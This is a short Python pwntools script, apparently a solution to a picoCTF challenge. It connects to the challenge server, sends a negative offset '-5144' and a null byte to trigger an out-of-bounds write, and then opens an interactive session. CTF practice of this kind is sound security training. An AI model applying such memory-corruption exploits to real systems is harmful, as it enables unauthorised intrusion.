from pwn import *

p = remote('mercury.picoctf.net', 49825)

address = b'-5144'
value = b'\x00' 

p.sendline(address)
p.sendline(value)

p.interactive()